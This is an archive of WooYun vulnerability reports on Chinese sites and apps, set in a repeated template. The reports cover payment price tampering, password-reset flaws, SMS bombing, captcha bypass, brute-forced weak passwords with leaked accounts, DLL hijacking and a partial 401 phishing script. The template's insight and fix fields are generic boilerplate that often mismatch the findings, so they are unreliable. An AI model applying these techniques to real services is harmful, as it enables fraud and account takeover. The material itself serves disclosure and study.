**厂商**: 纽曼电子 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: （PS：纽曼看此文前请把这个大漏洞给修了，否则这个洞修了等于没修：WooYun: 纽曼手机官网注入可致秒杀插队（或用户地址泄露））===========================问题根源：www.newman.mobi 的纠结业务体系和不当的程序结合从www.newman.mobi 的摸底情况来看，用户订单和商品管理采用了改动过的ecshop，而秒杀项目“午市”则采取了精简过的phpcms。两者的逻辑通过某些共用的session和缓存等传递。而且还有一个大家可能都想不到的亮点，那就是用了redis作缓存器和k-v存储（其实我很惊叹传统企业敢起用nosql）。以上架构表明，程序员还是有功底的，做过程序结合的人都深感不易（所以认真建议，不要炒人）。但问题是，过分关注架构，可能会导致程序结合不当，导致马奇诺防线问题的产生——你以为大家都会走设定好的通道，结果人家可以抄另一条路达到目的。当然

**POC**: 前期准备：（1）注册两个测试账号（2）安装chrome浏览器、安装插件Tampermonkey（3）编写测试脚本，然后让Tampermonkey以<script>插入到对应通道的页面上。通道一（https://example.com/[已脱敏] ）的测试脚本，关键点是如何自动弹出验证码和自动重复提交。代码见：https://example.com/[已脱敏]  ）的测试脚本，关键点是如何取消addToCart的重试限制。代码见：https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 回头来看，纽曼有一个防御是值得借鉴的，那就是没在秒杀时间内不放出验证码（显示为空白）。这种防御提前自动化验证码破解的尝试值得肯定，但在通道一的大部分逻辑都被清晰掌握的情况下有多少效果，个人是存在疑惑的。另一方面，服务器在高并发下频繁出现的502、数据库和redis连接失败，多多少少挡住了前端脚本攻击
---

---
### [wooyun-2014-070576] 业务逻辑：100%可以获取套票
**厂商**: 365jia.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以根据此漏洞，可以100%获取“美丽六安景区套票”奖励。

**POC**: 修改返回值

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-063644] 某会考报名系统验证码绕过可暴力破解（可导致用户信息泄露）
**厂商**: 某会考报名系统 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某省2014年普通高中学业水平考试网上报名系统地址：https://example.com/[已脱敏]

**POC**: 会考证是有规律的，我拿我们学校考号去跑倒是跑出了多个123456由于一些原因我就不发图了。请自行测试！

**绕过**: 直接利用

**修复**: 你们比我懂（我也是高中党！过几天我也要会考了，哥哥or姐姐给点RANK鼓励一下吧）
---

---
### [wooyun-2012-08480] 拉卡拉任意修改其他用户密码漏洞
**厂商**: 拉卡拉网络技术有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在查找用户操作的敏感逻辑中，我们发现整个重制密码的流程存在严重安全隐患，首先自己重置下自己的密码得到如下连接：https://example.com/[已脱敏] id="passwordResetForm" name="passwordResetForm" method="post" action="/default/passwordReset.do"><input type="hidden" id="userId" name="userId" value="1000244181"><ul class="list3"><li><div class="n1">新密码:</div><input type="passwo

**POC**: 不多说了吧

**绕过**: 直接利用

**修复**: 不多说了吧
---

---
### [wooyun-2013-018212] 突破好大夫手机内容及条数限制
**厂商**: 好大夫在线 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 短信轰炸：测试过程中发现，如果单纯的发送短信到某个手机上，最多只能三条；但是如果每条短信内容不同，就可以突破，可能是检测短信内容的MD5校验？所以我每天短信加个变量。。。短信内容控制： 数据包里面的CONTENT可以控制，为啥？ 不应该出现这种错误，要打小PP。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 最好是限制手机号的发送次数！有些参数放到服务端！
---

---
### [wooyun-2013-033275] 某互联网公司2013的DLL劫持漏洞可被用于后门
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在干净的win xp操作系统中，如果只用原来的Directx及Flash，不安装新版Directx及Flash，某互联网公司 2013的libcef.dll会加载如下几个不存在的DLL，造成可能的DLL劫持发生，危害性不用说明了吧。（注：该问题对某互联网公司的其它版也应该同样存在，没有一一测试，同时flash的更新也不是必要条件，只是实验时采用如此条件，就说明一下）d3dcompiler_43.dlld3dx9_43.dlllibglesv2.dll

**POC**: 好吧，昨天上报被拒，今天上个图证明一下吧。

**绕过**: 直接利用

**修复**: 厂商懂得。
---

---
### [wooyun-2013-028838] 木星游戏官方网站充值系统漏洞
**厂商**: 木星游戏 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  存在支付漏洞！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们应该懂得！
---

---
### [wooyun-2013-023152] 某互联网公司-某社交平台认证机制存在严重缺陷 可直接控制他人某社交平台
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 部署在某互联网公司m.3g.某域名.com的某社交平台接口，仅仅通过用户的一个固定UID进行用户认证，如果直接通过算法算出每个用户的固定md5 UID，即可大面积沦陷某社交平台业务。具体认证接口如下https://example.com/[已脱敏] 点开某互联网公司某个联系人信息#2 复制链接或者在浏览器中打开，你将获得如下认证链接。https://example.com/[已脱敏] UID。#3 利用搜索引擎大面积搜索类似链接#4 利用获取到的UID进行操作#5 成功收听道哥某社交平台

**POC**: 成功收听道哥某社交平台

**绕过**: 直接利用

**修复**: 认证因子动态随机化，并加入过期机制。
---

---
### [wooyun-2013-024606] 某互联网公司程序对URL的识别存在逻辑问题可导致绕过（IE浏览器也存在安全漏洞）
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个照片的人你认识吗？她说和你吃过饭，你看看https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 跳转到了钓鱼站点某互联网公司程序对URL的识别不精准. 程序员粗心
---

---
### [wooyun-2015-0134458] 某鲜花连锁店逻辑漏洞造成一元买花
**厂商**: 香里香鲜花连锁店 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 七夕来了，搞一波卖花的   http://**.**.**.**/

**POC**: 首先，首页 **.**.**.**选择一束花，选择没注册直接购买！按照正常购物流程，一直往下走~到这里。开Burpsuite。抓包发现把pay order amount后面的491改为1~就是价格了。扫一下就支付成功了。为了不给老板带来苦扰，不下单了啊~！

**绕过**: 直接利用

**修复**: 你比我聪明比我强~
---

---
### [wooyun-2015-092150] 某电商平台浏览器DLL劫持漏洞
**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某电商平台浏览器最新版（版本3.5.1.1084），官方下载安装版本taobrowser([IP已脱敏]4)-bc-ars.exe，windows xp sp4环境，某电商平台浏览器的主程序在运行中浏览某些特定网页(如某视频网站)后关闭页面时会加载一个不带路径的alidcp.dll文件（该文件没有随某电商平台浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，严重时可危害浏览器用户的安全，如帐号窃取、网络钓鱼等。同时旧版本中存在的dxva2.dll、mf.dll等同样的问题依然没有解决，在新版本中仍可检测到。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格审查DLL加载。
---

---
### [wooyun-2015-0103427] 12306新版选择图片验证码存在逻辑漏洞导致限制可被绕过（理论可以令抢票软件复活）
**厂商**: 12306 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 12306 新的图片验证码可以被绕过, 可以继续用老的4字母验证码登陆12306 .老的4字母验证码比较容易电脑识别, 可以用注册或其他验证码接口直接登录.漏洞1:https://example.com/[已脱敏] passenger 。这两个连接可以获取4字母验证码, 12306登陆接口可以用这里识别的验证码直接登录. 这个情况下, 新的图片验证码形同虚设.

**POC**: 1. 先获取验证码(老的4字母验证码)GET https://example.com/[已脱敏] HTTP/1.12. 电脑识别验证码, 检查验证码正确POST https://example.com/[已脱敏] HTTP/1.1randCode=9npm&rand=sjrand&randCode_validate=3. Post到Login网址, 即可登陆POST https://kyfw.1

**绕过**: 过滤绕过

**修复**: 建议全面更新验证码, 排查老验证码漏洞.
---

---
### [wooyun-2014-087466] 多款手机浏览器UI跨域钓鱼漏洞（UC/某搜索引擎/某电脑厂商等）
**厂商**: UC，某搜索引擎，某电脑厂商等 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 好吧，我先承认这不是真正意义上的跨域，但可以造成同样的效果。测试了几款国产安卓浏览器，发现UC（最新版）、某搜索引擎浏览器（最新版）、某电脑厂商(vibe ui自带浏览器)、某通信厂商(3c自带浏览器)中存在该问题。其它浏览器未必不存在，只是对我这个exp不敏感罢了（要么弹不出新窗口，要么对401对话框不敏感）。现在安卓浏览器都可以打开很多标签页，而且每个标签页之间都严格遵守同源策略，互不干扰。但有一种情况，当浏览器中同时存在两个已经打开的标签页时，并且用户正在浏览b标签，此时a标签弹出一个由js形成的浏览器对话框（例如alert、confirm、prompt以及401auth），如果这个窗体是全局的，那么这个窗体将会出现在b标签页的上方，如果又没有明确提示来源页的话，那么用户会误认为是b标签页弹出的信息，从而导致钓鱼或者欺骗。

**POC**: 下面就是利用该方式跨域某电商平台进行401钓鱼的演示auth.php<?if($_SERVER['PHP_AUTH_PW'] =="" || $_SERVER['PHP_AUTH_USER'] =="" ){header('WWW-Authenticate: Basic realm="-taobao.com                                                                                                                                                     

**绕过**: 直接利用

**修复**: 不要全局的框框
---

---
### [wooyun-2015-0154750] 中国招标网某功能设计逻辑缺陷可撞库（成功帐号证明）
**厂商**: 中国招标网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国招标网http://**.**.**.**/logon.do在用户登录地区没有验证码机制二话不说抓包，发现post的用户名和密码都是明文的用top500百家姓+密码123456爆破（为665,666,667的都是密码正确的）就是这样

**POC**: 泄露用户（部分）密码都为1234566642	lidewang	200	false	false	66512828	lihongqin	200	false	false	66561542	wangjinlin	200	false	false	6659142	lifengmei	200	false	false	66611561	liguisheng	200	false	false	66611867	lihaijian	200	false	false	66611948	lihaitong	200	false	false	66614314	lijianxin	200	false	false	666141

**绕过**: 直接利用

**修复**: 添加验证码机制
---

---
### [wooyun-2015-0113916] 淘世界(爱美主义)支付漏洞一分钱随便买
**厂商**: aimeizhuyi.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过burp抓包修改参数可以一分钱购买商品，且已发货！

**POC**: 习惯性抓包先选中一款我种草很久的爽肤水下一步提交订单使用burp抓包截获返回值选中地方看到需要支付的钱数改为0.01支付成功某电商平台截图返回淘世界显示已支付全款这是我今天早上为了写报告还原的流程，前几天第一次发现的测试的订单已经发货了。说明没有人工审核。而且你们页面上居然没有取消订单的选项！！！请联系我，提供收件人信息，你们自行拦截货物。应该不会为了几十块国际运费查我水表吧哈哈哈

**绕过**: 直接利用

**修复**: 加密加密加密，这些你们自己懂
---

---
### [wooyun-2015-0162432] 中国广播电影电视节目交易中心设计逻辑缺陷造成信息泄露
**厂商**: 中国广播电影电视节目交易中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国广播电影节目交易中心邮箱对互联网开放，并且入口处防护不严可登陆，导致大量敏感信息存在泄露风险。1、入口：http://**.**.**.**/2、暴力破解破解成功的弱口令：wangle/passwordyangjing/password3、敏感信息小日本的查询通讯录，可以爆破更多的弱口令，不深入测试，关键是入口处防护

**POC**: 1、入口：http://**.**.**.**/2、暴力破解破解成功的弱口令：wangle/passwordyangjing/password3、敏感信息小日本的查询通讯录，可以爆破更多的弱口令，不深入测试，关键是入口处防护

**绕过**: 直接利用

**修复**: 1、加强邮箱入口防护，增加验证码，增加锁定机制；2、建议处置弱口令问题。
---

---
### [wooyun-2015-091309] 桌面版某搜索引擎浏览器可被中间人攻击
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一句话来说：虽然某搜索引擎浏览器会对直接访问的网站校验TLS证书，但是对于iframe发起的HTTPS链接，不校验TLS证书是否有效。直接访问：使用iframe（左某搜索引擎，右IE11），测试地址：https://example.com/[已脱敏] html><html><head><meta charset="utf-8" /><title>MITM</title><style>iframe {opacity: 0;

**POC**: 打开Fiddler，打开解密HTTPS（不装Fiddler根证书），然后使用某搜索引擎浏览器打开在线测试地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 完善TLS证书校验。
---

---
### [wooyun-2012-06590] 用户认证过程中可以导致无限制发送手机验证码
**厂商**: 我中啦彩票网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，需要的是要注册一个用户名，注册过程无任命的限制，注册完成后，进行认证界面然后记录页面上的安全码后，构造链接如下https://example.com/[已脱敏]""&username=""&mobile=""&veriCode=""其中userid可以在认证的页面代码中直接找到，username就是你注册的用户名，mobile为你要攻击的手机号码，vericode为你的安全码。然后访问后，如果返回结果为1则成功，如果为3则为你的安全码是错误的。返回为2则你的攻击手机已经注册过了。有两个条件，第一：用户名必须是真实注册的。第二：在提交过程中，用户认证的页面是不能关闭的，一但关闭安全码失效无法进行攻击

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对提交的链接进行判断，禁止进行外部链接直接提交另外对安全码的时效性进行限制，应该限制安全码的时效性可以防止工具化
---

---
### [wooyun-2015-0109747] 美图看看远程代码执行漏洞
**厂商**: 美图秀秀 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美图看看KanKan.exe存在dll劫持漏洞KanKan.exe在启动时会加载dwmapi.dll这个dll是不存在的。只要将图片和dll放在一起 用美图看看查看图片的同事也会加载这个dll文件。在这之前有人发过美图秀秀的dll劫持。 而我这是美图看看的 不一样。dwmapi.dll

**POC**: rs

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0135031] 5288鲜花礼品网两处逻辑漏洞
**厂商**: 中国5288鲜花礼品网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞1. 任意金额修改，1元购进千元鲜花修改参数mnyRmbjg=1就可以1块钱购买上千块的鲜花漏洞2. 任意订单删除注册一个测试用户，要删除的订单号注册另一个用户，在会员服务->会员帐目选择一个审核中的漏洞然后点取消订单，burp抓包修改ddph为要删除的订单号TSBJD263365，然后burp一路前进，就删除成功刷新一下，订单状态变成取消订单了因为订单号是有规律的，遍历一下，可以删除任意订单，危害还是很大的

**POC**: 同上

**绕过**: 直接利用

**修复**: 校验金额，权限控制～
---

---
### [wooyun-2015-0109561] 中国教育考试网某逻辑漏洞导致部分用户沦陷（可进一步窃取用户）
**厂商**: 中国教育考试网 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 认证接口

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-011389] 任意某互联网公司秒点某下载工具图标
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，俺认为某互联网公司不应该忽略此类漏洞。1 虽然此类问题，严格来说不属于安全漏洞，但是是属于设计的逻辑缺陷的。2 此类漏洞，可以被利用去进行买卖从而获利，所以并不是没有利用价值。

**POC**: 实现方法：1 任意打开一个某域名.com域名的网站，登录获取cookie2 打开地址 https://example.com/[已脱敏] 点击我要点亮即可，无延迟，秒亮的证据图如下

**绕过**: 直接利用

**修复**: 稍微做下限制下就可以了。希望某互联网公司不要忽略、、、
---

---
### [wooyun-2015-0105424] 钻石小鸟官网支付漏洞低价格够买所有钻石（分分钟变钻石王老五）
**厂商**: 钻石小鸟 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我也不是什么高手就随便抓包上传试试，就发现这个漏洞。其实是个很低级的错误，但是关系到钱就挺严重的。从支付开始抓包发现问题，支付没有加验证然后我把价格改为10就是0.1然后价格就莫名奇妙的变成400了，这里加了md5验证改不了；然后我用各种方式测试，发现这个价格最低是400不能改了然后就到银行支付页面

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 支付加验证就行了
---

---
### [wooyun-2015-091414] 某生鲜电商账户逻辑漏洞
**厂商**: fruitday.com | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意注册用户密码重置，用户余额或消费券危险。1,登录网站点击 找回密码 输入自己的帐号，点击下一步。2，在同一网页标签打开另一网页，找回密码，输入目标帐号，点击下一步。3，自己的帐号页面点击获取验证码。4，将自己收到的验证码输入目标帐号验证码处，点击下一步。完成，密码重置。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的，另外，送点水果呗~~~
---

---
### [wooyun-2013-020902] 某互联网公司爆用户第一次所设置的某互联网公司帐号
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无聊间和妹子聊某互联网公司，发现一个，真是奇葩啊！

**POC**: 我们先加一下杨幂的某互联网公司喽，看到杨幂的现在某互联网公司号是:miniyangmi然后我们看到杨幂的一条信息现在我们去手机的设置，选择应用程序，选择管理应用程序，找到并且点某互联网公司，在点清除数据。然后在次登录某互联网公司，会显示载入数据中，然后原来的那条信息会显示出来，我们就可以看到用户第一次的某互联网公司帐号了。我们现在看到了杨幂第一次设置的某互联网公司号是：yangmi362297.有木有她的粉丝解释下362297是什么个意思哦？

**绕过**: 直接利用

**修复**: 你们懂得！
---

---
### [wooyun-2013-036640] 某互联网公司音乐最新版本多处DLL劫持
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时某互联网公司音乐默认安装路径：C:\Program Files\Tencent\某互联网公司Music具体利用方法：某互联网公司Music.exe运行时会加载四个不存在的DLL文件分别为：c:\windows\system32\macromed\common\swsupport.dllc:\windows\system32\macromed\shockwave\swsupport.dllC:\Program Files\Tencent\某互联网公司Music\p2plog.dllC:\Program Files\Tencent\某互联网公司Music\ieframe.dll只要相应的目录下放入对应名称的DLL文件，就会运行某互联网公司Music.exe的同时会加载对应的DLL以上是在无flash组件环境下测试的结果。如果在有安装flash组件环境下测试只劫持两个不存的DLL分别为C:\Program Files\Tencent\Q

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2016-0166185] 山东大学某系统设计逻辑缺陷导致学生信息泄露
**厂商**: 山东大学 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 山东大学学生信息服务平台 后台密码查询功能，可以泄露学生资料**.**.**.**/随便爆破一个账号进去账号：201200301308密码：1所有学生的密码都是1进去以后点击查询密码然后数据库是like%% 的模式搜索 所有学生信息一览无余！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 登录加个验证码  查询信息不要用like%%  然后。3个条件都相符合才允许查询！
---

---
### [wooyun-2015-0102292] 同程旅交汇低价支付高价订单订单随意修改（另种支付漏洞隐患）
**厂商**: 某旅游公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不知道后台计算的时候是按什么计算的，总之前台是可以通过url修改订单，而且是不需要权限的修改

**POC**: 首先注册一个号码：13111112343，然后正常下单：到订单里面点查看订单：点击返回修改点提交抓包重点就在这条url:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: DUANG
---

---
### [wooyun-2013-044480] 利用移动某客户端应用可批量获取用户服务密码(地区性)
**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 利用河南移动掌上营业厅客户端可以批量获取用户服务密码，比如输入手机号码13803710001，服务密码710001 提示密码错误，登陆失败 就把手机号码改成13803710002，服务密码710002，如果还是密码错误,就把手机号码改成13803710003,等等就这样反复试下去，不停的试你会得到很多手机号码的服务密码，得到别人号码服务密码后你就可以给别人号码办业务，可以进入别人139邮箱，飞信，移动微薄等应用，最牛的就是可以给别人号码设置呼叫转移，设置呼叫转移后就可以接听打给别人的电话，用别人号码去注册网络电话,利用网络电话的回拨功能就可以用别人号码打电话。

**POC**: 我从135****4090试到135****4360所得到的号码的服务密码，服务密码为手机号码后6位，号码为135****4092,135****4102,135****4118,135****4125,135****4131,135****4132,135****4162,135****4186,135****4188,135****4191,135****4195,135****4199,135****4211,135****4212,135****4216,135****4219，135****4225,135****4227,135****4230,135****4238,135***

**绕过**: 直接利用

**修复**: 1.添加上验证码，2.当一个手机多次登录失败后禁止再试其他号码的服务密码，3.禁止弱密码可以办业务
---

---
### [wooyun-2013-038943] 某搜索引擎输入法调用CreateProcess函数漏洞
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Microsoft Windows API使用CreateProcess()函数创建新的进程及其主线程。CreateProcess()函数的格式如下：BOOL CreateProcess(LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);lpApplication

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对传入给CreateProcess函数的名称和参数用双引号””进行包含
---

---
### [wooyun-2016-0180488] 砖题库APP任意手机号密码重置+短信轰炸
**厂商**: 华图教育 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Content-Type: application/x-www-form-urlencoded;charset=UTF-8sid: 0username:某互联网公司openid: 0imei: 08:00:27:b4:8b:30c_platform: androiduserid: 0ua: Google Galaxy Nexus - 4.3 - API 18 - 720x1280_2-Android4.3areaid: 0c_version: NetSchool_1.6

**POC**: 如上

**绕过**: 直接利用

**修复**: 取消回显
---

---
### [wooyun-2015-0154369] 我想买个手表之某视频网站商城支付漏洞
**厂商**: 某视频网站网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便选择一个手表等等，下面的东西也想让我买吗？好吧，那就一起吧提交订单选择某电商平台支付，提交，抓包修改成1，forward

**POC**: 随便选择一个手表等等，下面的东西也想让我买吗？好吧，那就一起吧提交订单选择某电商平台支付，提交，抓包修改成1，forward

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0103945] 优个网存在支付逻辑漏洞(1分钱支付)
**厂商**: yoger.com.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1 这里随便选了个商品作为演示，未真正支付利用。2 正常下单程序去下单，然后支付，直到这一步。3 然后发现付款，其实就是访问链接https://example.com/[已脱敏] 发现前面的orderID就是订单号，后面的paySum就是支付的金额总和。那么果断修改下再访问，把1090改成0.01。https://example.com/[已脱敏] 呵呵，这样就可以一分钱购买了。

